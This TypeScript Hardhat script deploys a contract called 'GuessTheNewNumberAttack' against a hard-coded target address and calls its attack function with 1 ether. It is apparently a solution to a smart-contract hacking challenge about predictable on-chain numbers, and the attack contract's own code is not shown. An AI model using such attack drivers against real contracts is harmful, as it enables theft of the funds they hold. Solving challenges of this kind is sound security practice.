import { utils } from "ethers";
import { ethers } from "hardhat";

const contractAddress = "0x17b7d432390Fb65F4DebA5827fe92E199F353506";

async function main() {
  const factory = await ethers.getContractFactory("GuessTheNewNumberAttack");
  const contract = await factory.deploy(contractAddress);
  await contract.deployed();

  const tx = await contract.attack({ value: utils.parseEther("1") });
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
